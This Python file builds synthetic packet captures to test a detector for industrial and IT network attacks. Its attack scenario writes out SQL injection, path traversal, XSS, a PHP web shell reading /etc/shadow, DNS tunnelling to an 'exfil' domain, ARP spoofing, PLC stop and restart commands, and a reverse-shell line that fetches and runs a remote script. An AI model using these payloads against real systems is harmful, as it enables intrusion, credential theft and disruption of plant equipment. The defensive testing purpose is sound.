"""
Synthetic PCAP factory for tests.

Builds small, deterministic captures that exercise every OT/IT protocol parser
and every major detection path of the analyzer. Requires scapy (dev dependency).
"""
import base64
import random
import struct

from scapy.all import ARP, DNS, DNSQR, IP, TCP, UDP, Ether, Raw, wrpcap, Dot1Q  # noqa: F401

BASE_TS = 1_767_225_600.0  # 2026-01-01 00:00:00 UTC

HMI = "192.168.10.10"
PLC = "192.168.10.20"
RTU = "192.168.10.30"
ATTACKER = "192.168.10.66"
WEB = "192.168.10.80"
DNS_SRV = "192.168.10.53"
C2 = "203.0.113.50"

MAC_HMI = "00:0c:29:11:11:11"
MAC_PLC = "00:1b:1b:22:22:22"   # Siemens OUI
MAC_ATT = "de:ad:be:ef:00:01"


class _Builder:
    def __init__(self):
        self.pkts = []
        self.ts = BASE_TS
        self.sport = 40000
        self._seq = {}  # per-direction TCP sequence numbers

    def _next_seq(self, key, length, flags):
        seq = self._seq.get(key, 1000)
        self._seq[key] = (seq + length + (1 if ("S" in flags or "F" in flags) else 0)) & 0xFFFFFFFF
        return seq

    def _stamp(self, pkt, dt=0.01):
        self.ts += dt
        pkt.time = self.ts
        self.pkts.append(pkt)
        return pkt

    def tcp(self, src, dst, sport, dport, payload=b"", flags="PA", dt=0.01,
            smac=MAC_HMI, dmac=MAC_PLC, seq=None):
        if seq is None:
            seq = self._next_seq((src, dst, sport, dport), len(payload), flags)
        p = Ether(src=smac, dst=dmac) / IP(src=src, dst=dst) / TCP(
            sport=sport, dport=dport, flags=flags, seq=seq)
        if payload:
            p = p / Raw(payload)
        return self._stamp(p, dt)

    def udp(self, src, dst, sport, dport, payload, dt=0.01, smac=MAC_HMI, dmac=MAC_PLC):
        p = Ether(src=smac, dst=dmac) / IP(src=src, dst=dst) / UDP(sport=sport, dport=dport) / Raw(payload)
        return self._stamp(p, dt)

    def raw(self, pkt, dt=0.01):
        return self._stamp(pkt, dt)

    def write(self, path):
        wrpcap(str(path), self.pkts)
        return path


# ---------------------------------------------------------------- payloads
def modbus(tid, unit, fc, body):
    return struct.pack(">HHHBB", tid, 0, len(body) + 2, unit, fc) + body


def s7_job(func, params_tail=b"", rosctr=0x01):
    param = bytes([func]) + params_tail
    s7 = struct.pack(">BBHHHH", 0x32, rosctr, 0, 1, len(param), 0) + param
    cotp = b"\x02\xf0\x80"
    tpkt = struct.pack(">BBH", 3, 0, 4 + len(cotp) + len(s7))
    return tpkt + cotp + s7


def s7_ackdata(func):
    param = bytes([func, 0x01])
    s7 = struct.pack(">BBHHHHBB", 0x32, 0x03, 0, 1, len(param), 0, 0, 0) + param
    cotp = b"\x02\xf0\x80"
    return struct.pack(">BBH", 3, 0, 4 + len(cotp) + len(s7)) + cotp + s7


def dnp3(func, app_ctrl=0xC0):
    user = bytes([0xC0, app_ctrl, func]) + b"\x00" * 3
    hdr = b"\x05\x64" + bytes([5 + len(user), 0xC4]) + struct.pack("<HH", 10, 1) + b"\x00\x00"
    return hdr + user + b"\x00\x00"  # user data block + its (dummy) CRC


def enip_rr(cip_service):
    cip = bytes([cip_service, 0x02, 0x20, 0x06, 0x24, 0x01])
    cpf = struct.pack("<IHH", 0, 10, 2) + struct.pack("<HH", 0, 0) + struct.pack("<HH", 0xB2, len(cip)) + cip
    hdr = struct.pack("<HHII8sI", 0x006F, len(cpf), 0x1234, 0, b"\x00" * 8, 0)
    return hdr + cpf


def enip_cmd(cmd):
    return struct.pack("<HHII8sI", cmd, 0, 0, 0, b"\x00" * 8, 0)


def iec104_i(type_id, cot=6):
    asdu = bytes([type_id, 1, cot, 0, 1, 0, 0x01, 0x00, 0x00, 0x01])
    apci = b"\x00\x00\x00\x00"
    return bytes([0x68, len(apci) + len(asdu)]) + apci + asdu


def iec104_u(ctrl):
    return bytes([0x68, 4, ctrl, 0, 0, 0])


def bacnet_confirmed(service, invoke=7):
    apdu = bytes([0x00, 0x05, invoke, service, 0x0C, 0x00, 0x00, 0x00, 0x01])
    npdu = b"\x01\x04"
    return b"\x81\x0a" + struct.pack(">H", 4 + len(npdu) + len(apdu)) + npdu + apdu


def bacnet_whois():
    npdu = b"\x01\x20\xff\xff\x00\xff"
    apdu = b"\x10\x08"
    return b"\x81\x0b" + struct.pack(">H", 4 + len(npdu) + len(apdu)) + npdu + apdu


def mqtt_connect(client=b"sensor-1"):
    vh = b"\x00\x04MQTT\x04\x02\x00\x3c"
    pl = struct.pack(">H", len(client)) + client
    body = vh + pl
    return bytes([0x10, len(body)]) + body


def mqtt_publish(topic=b"plant/line1/temp", msg=b"21.5"):
    body = struct.pack(">H", len(topic)) + topic + msg
    return bytes([0x30, len(body)]) + body


def opcua_hello(url=b"opc.tcp://plc:4840"):
    body = struct.pack("<IIIII", 0, 65536, 65536, 0, 0) + struct.pack("<I", len(url)) + url
    return b"HELF" + struct.pack("<I", 8 + len(body)) + body


def opcua_msg(service_id=673):  # 673 = WriteRequest
    body = struct.pack("<IIII", 1, 1, 1, 1) + bytes([0x01, 0x00]) + struct.pack("<H", service_id) + b"\x00" * 8
    return b"MSGF" + struct.pack("<I", 8 + len(body)) + body


# ---------------------------------------------------------------- scenarios
def build_ot_protocols(path):
    """One or more packets for every supported OT protocol."""
    b = _Builder()
    for i in range(5):
        b.tcp(HMI, PLC, 50200, 502, modbus(i + 1, 1, 3, struct.pack(">HH", 0, 10)))
        b.tcp(PLC, HMI, 502, 50200, modbus(i + 1, 1, 3, bytes([20]) + b"\x00" * 20))
    b.tcp(HMI, PLC, 50200, 502, modbus(9, 1, 6, struct.pack(">HH", 300, 1234)))
    b.tcp(HMI, PLC, 50200, 502, modbus(10, 1, 16, struct.pack(">HHB", 400, 2, 4) + b"\x00\x01\x00\x02"))
    b.tcp(HMI, PLC, 50200, 502, modbus(11, 1, 8, b"\x00\x01\x00\x00"))
    b.tcp(PLC, HMI, 502, 50200, modbus(11, 1, 0x81, b"\x01"))
    # S7comm (session setup first, as a real engineering station would)
    b.tcp(HMI, PLC, 50102, 102, s7_job(0xF0, b"\x00\x00\x01\x00\x01\x01\xe0"))
    b.tcp(HMI, PLC, 50102, 102, s7_job(0x04, b"\x01"), dmac=MAC_PLC)
    b.tcp(HMI, PLC, 50102, 102, s7_job(0x05, b"\x01"))
    b.tcp(PLC, HMI, 102, 50102, s7_ackdata(0x04))
    b.tcp(HMI, PLC, 50102, 102, s7_job(0x29, b"\x00" * 9 + b"\x09P_PROGRAM"))
    # DNP3
    b.tcp(HMI, RTU, 50020, 20000, dnp3(0x01))
    b.tcp(HMI, RTU, 50020, 20000, dnp3(0x0D))
    # EtherNet/IP
    b.tcp(HMI, PLC, 50818, 44818, enip_cmd(0x0065))
    b.tcp(HMI, PLC, 50818, 44818, enip_rr(0x4C))
    b.tcp(HMI, PLC, 50818, 44818, enip_rr(0x4D))
    # IEC 104
    b.tcp(HMI, RTU, 52404, 2404, iec104_u(0x07))
    b.tcp(RTU, HMI, 2404, 52404, iec104_u(0x0B))
    b.tcp(HMI, RTU, 52404, 2404, iec104_i(100))
    b.tcp(HMI, RTU, 52404, 2404, iec104_i(45))
    b.tcp(HMI, RTU, 52404, 2404, iec104_u(0x13))
    # OPC UA
    b.tcp(HMI, PLC, 54840, 4840, opcua_hello())
    b.tcp(HMI, PLC, 54840, 4840, opcua_msg())
    # MQTT
    b.tcp(HMI, PLC, 51883, 1883, mqtt_connect())
    b.tcp(HMI, PLC, 51883, 1883, mqtt_publish())
    # BACnet (UDP)
    b.udp(HMI, "192.168.10.255", 47808, 47808, bacnet_whois())
    b.udp(HMI, PLC, 47808, 47808, bacnet_confirmed(15))  # WriteProperty
    b.udp(HMI, PLC, 47808, 47808, bacnet_confirmed(20))  # ReinitializeDevice
    # Modbus/UDP
    b.udp(HMI, PLC, 50502, 502, modbus(1, 1, 4, struct.pack(">HH", 0, 2)))
    return b.write(path)


def build_attacks(path):
    """Attack-heavy capture: scanning, brute force, OT manipulation, web, DNS tunnel, ARP spoof, beacon, exfil."""
    rnd = random.Random(42)
    b = _Builder()
    # Normal baseline traffic first
    for i in range(20):
        b.tcp(HMI, PLC, 50200, 502, modbus(i, 1, 3, struct.pack(">HH", 0, 10)), dt=1.0)
    # 1. Port scan (SYNs to many ports) + RSTs back
    for port in list(range(1, 120)) + [502, 102, 20000, 44818, 2404]:
        b.tcp(ATTACKER, PLC, 61000, port, flags="S", dt=0.001, smac=MAC_ATT)
    # 2. Brute force SSH (many RSTs)
    for i in range(40):
        b.tcp(ATTACKER, WEB, 62000 + i, 22, flags="R", dt=0.05, smac=MAC_ATT)
    # 3. RDP / SMB admin-port and lateral movement
    for host in range(100, 115):
        b.tcp(ATTACKER, f"192.168.10.{host}", 63000, 445, flags="S", dt=0.01, smac=MAC_ATT)
        b.tcp(ATTACKER, f"192.168.10.{host}", 63001, 3389, flags="S", dt=0.01, smac=MAC_ATT)
    # 4. Modbus write storm + broadcast write + diagnostics restart
    for i in range(80):
        b.tcp(ATTACKER, PLC, 50555, 502, modbus(100 + i, 1, 6, struct.pack(">HH", 40001, rnd.randint(0, 65535))),
              dt=0.02, smac=MAC_ATT)
    b.tcp(ATTACKER, PLC, 50555, 502, modbus(500, 0, 5, struct.pack(">HH", 1, 0xFF00)), smac=MAC_ATT)
    b.tcp(ATTACKER, PLC, 50555, 502, modbus(501, 1, 8, b"\x00\x01\xff\x00"), smac=MAC_ATT)
    b.tcp(ATTACKER, PLC, 50555, 502, modbus(502, 1, 90, b"\x00\x10"), smac=MAC_ATT)
    # Replay: identical write packets
    for i in range(10):
        b.tcp(ATTACKER, PLC, 50600 + i, 502, modbus(777, 1, 6, struct.pack(">HH", 10, 9999)), dt=0.5, smac=MAC_ATT)
    # 5. S7 PLC stop + program download
    b.tcp(ATTACKER, PLC, 50102, 102, s7_job(0x1A, b"\x00" * 8), smac=MAC_ATT)
    b.tcp(ATTACKER, PLC, 50102, 102, s7_job(0x1B, b"\x00" * 8), smac=MAC_ATT)
    b.tcp(ATTACKER, PLC, 50102, 102, s7_job(0x1C, b"\x00" * 8), smac=MAC_ATT)
    b.tcp(ATTACKER, PLC, 50102, 102, s7_job(0x29, b"\x00" * 9 + b"\x09P_PROGRAM"), smac=MAC_ATT)
    # 6. DNP3 cold restart / stop application
    for fc in (0x0D, 0x0E, 0x12, 0x15):
        b.tcp(ATTACKER, RTU, 50020, 20000, dnp3(fc), smac=MAC_ATT)
    # 7. HTTP attacks
    reqs = [
        b"GET /index.php?id=1'%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: web\r\nUser-Agent: sqlmap/1.7\r\n\r\n",
        b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: web\r\nUser-Agent: curl/8\r\n\r\n",
        b"GET /search?q=<script>alert(1)</script> HTTP/1.1\r\nHost: web\r\n\r\n",
    ]
    shell_body = b"cmd=" + base64.b64encode(b"system('whoami; cat /etc/shadow');")
    reqs.append(b"POST /uploads/shell.php HTTP/1.1\r\nHost: web\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                b"Content-Length: " + str(len(shell_body)).encode() + b"\r\n\r\n" + shell_body)
    reqs.append(b"POST /upload.php HTTP/1.1\r\nHost: web\r\nContent-Length: 60\r\n\r\n<?php eval($_POST['x']); system($_GET['c']); ?>        ")
    for i, r in enumerate(reqs):
        b.tcp(ATTACKER, WEB, 55000 + i, 80, r, smac=MAC_ATT)
    # Directory brute force (many 404s)
    for i in range(60):
        b.tcp(ATTACKER, WEB, 56000 + i, 80, f"GET /admin{i} HTTP/1.1\r\nHost: web\r\n\r\n".encode(), dt=0.01, smac=MAC_ATT)
        b.tcp(WEB, ATTACKER, 80, 56000 + i, b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n", dt=0.01)
    # 8. DNS tunneling
    for i in range(40):
        label = base64.b32encode(rnd.randbytes(30)).decode().strip("=").lower()
        q = Ether(src=MAC_ATT) / IP(src=ATTACKER, dst=DNS_SRV) / UDP(sport=53000 + i, dport=53) / DNS(
            rd=1, qd=DNSQR(qname=f"{label}.{i}.exfil.evil-tunnel.com", qtype="TXT"))
        b.raw(q, dt=0.05)
    # 9. ARP spoofing: attacker claims PLC IP, then gratuitous flood
    for i in range(6):
        b.raw(Ether(src=MAC_PLC, dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, hwsrc=MAC_PLC, psrc=PLC, hwdst="ff:ff:ff:ff:ff:ff", pdst=PLC))
        b.raw(Ether(src=MAC_ATT, dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, hwsrc=MAC_ATT, psrc=PLC, hwdst="ff:ff:ff:ff:ff:ff", pdst=PLC))
    # 10. C2 beacon (regular 30s) and exfiltration to public IP
    for i in range(15):
        b.tcp(PLC, C2, 49999, 443, flags="S", dt=30.0, smac=MAC_PLC)
    for i in range(300):
        b.tcp(HMI, C2, 49998, 443, rnd.randbytes(1400), dt=0.01)
    # 11. Reverse shell style post-exploitation stream
    b.tcp(WEB, ATTACKER, 4444, 51000, b"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n", smac=MAC_ATT)
    b.tcp(ATTACKER, WEB, 51000, 4444, b"wget http://203.0.113.50/x.sh -O /tmp/x.sh; chmod +x /tmp/x.sh; /tmp/x.sh\n", smac=MAC_ATT)
    return b.write(path)


def build_edge_cases(path):
    """Malformed / unusual frames that must not crash the analyzer."""
    b = _Builder()
    b.tcp(HMI, PLC, 50200, 502, b"\x00")                      # truncated Modbus
    b.tcp(HMI, PLC, 50200, 502, b"\xff" * 300)                # garbage on 502
    b.tcp(HMI, PLC, 50102, 102, b"\x03\x00\x00\x07\x02\xf0")  # truncated TPKT
    b.tcp(HMI, RTU, 50020, 20000, b"\x05\x64")                # truncated DNP3
    b.tcp(HMI, RTU, 52404, 2404, b"\x68\xff\x00")             # bad IEC104
    b.tcp(HMI, PLC, 51883, 1883, b"\x30\xff\xff\xff\xff\x7f")  # bad MQTT length
    b.tcp(HMI, PLC, 54840, 4840, b"MSGF\xff\xff\xff\xff")     # bad OPC UA
    b.udp(HMI, PLC, 47808, 47808, b"\x81")                    # bad BACnet
    b.udp(HMI, DNS_SRV, 5353, 53, b"\x00" * 12 + b"\xc0\x0c" * 20)  # DNS pointer loop
    b.tcp(HMI, WEB, 50080, 80, b"GET / HTTP/1.1\r\nContent-Length: abc\r\n\r\n")
    # VLAN-tagged Modbus and ARP
    b.raw(Ether(src=MAC_HMI, dst=MAC_PLC) / Dot1Q(vlan=10) / IP(src=HMI, dst=PLC) /
          TCP(sport=50201, dport=502, flags="PA") / Raw(modbus(1, 1, 3, struct.pack(">HH", 0, 1))))
    b.raw(Ether(src=MAC_ATT, dst="ff:ff:ff:ff:ff:ff") / Dot1Q(vlan=10) / ARP(op=2, hwsrc=MAC_ATT, psrc=PLC, pdst=PLC))
    # IPv6 Modbus
    from scapy.all import IPv6
    b.raw(Ether(src=MAC_HMI, dst=MAC_PLC) / IPv6(src="fd00::10", dst="fd00::20") /
          TCP(sport=50202, dport=502, flags="PA") / Raw(modbus(2, 1, 3, struct.pack(">HH", 0, 1))))
    # Tiny frames / non-IP ethertype
    b.raw(Ether(src=MAC_HMI, dst=MAC_PLC, type=0x88CC) / Raw(b"\x00" * 10))
    b.raw(Ether(src=MAC_HMI, dst=MAC_PLC) / IP(src=HMI, dst=PLC) / TCP(sport=1, dport=2, flags="A"))
    return b.write(path)


def opcua_read():
    return opcua_msg(631)


def build_benign(path):
    """Realistic, attack-free plant traffic. The analyzer should raise no alerts."""
    b = _Builder()
    b.tcp(HMI, PLC, 50102, 102, s7_job(0xF0, b"\x00\x00\x01\x00\x01\x01\xe0"))
    b.tcp(HMI, RTU, 52404, 2404, iec104_u(0x07))
    b.tcp(RTU, HMI, 2404, 52404, iec104_u(0x0B))
    b.tcp(HMI, PLC, 54840, 4840, opcua_hello())
    b.tcp(HMI, PLC, 51883, 1883, mqtt_connect())
    for i in range(120):  # two minutes of 1 s polling
        tid = (i % 65535) + 1
        b.tcp(HMI, PLC, 50200, 502, modbus(tid, 1, 3, struct.pack(">HH", 0, 10)), dt=0.5)
        b.tcp(PLC, HMI, 502, 50200, modbus(tid, 1, 3, bytes([20]) + bytes(range(20))), dt=0.01)
        if i % 10 == 0:
            b.tcp(HMI, PLC, 50102, 102, s7_job(0x04, b"\x01\x12\x0a\x10\x02\x00\x01\x00\x01\x84\x00\x00\x00"))
            b.tcp(PLC, HMI, 102, 50102, s7_ackdata(0x04))
            b.tcp(HMI, RTU, 50020, 20000, dnp3(0x01))
            b.tcp(HMI, PLC, 54840, 4840, opcua_read())
            b.tcp(HMI, PLC, 51883, 1883, mqtt_publish(msg=f"{20 + i % 3}.5".encode()))
        if i % 30 == 0:
            q = Ether(src=MAC_HMI) / IP(src=HMI, dst=DNS_SRV) / UDP(sport=33000 + i, dport=53) / DNS(
                rd=1, qd=DNSQR(qname="historian.plant.local", qtype="A"))
            b.raw(q)
            b.tcp(HMI, WEB, 51000 + i, 80,
                  b"GET /dashboard?line=1&view=trend HTTP/1.1\r\nHost: hmi.plant.local\r\n"
                  b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: text/html\r\n\r\n")
            b.tcp(WEB, HMI, 80, 51000 + i, b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
        if i % 60 == 0:
            b.raw(Ether(src=MAC_HMI, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, hwsrc=MAC_HMI, psrc=HMI, pdst=PLC))
            b.raw(Ether(src=MAC_PLC, dst=MAC_HMI) / ARP(op=2, hwsrc=MAC_PLC, psrc=PLC, hwdst=MAC_HMI, pdst=HMI))
    return b.write(path)
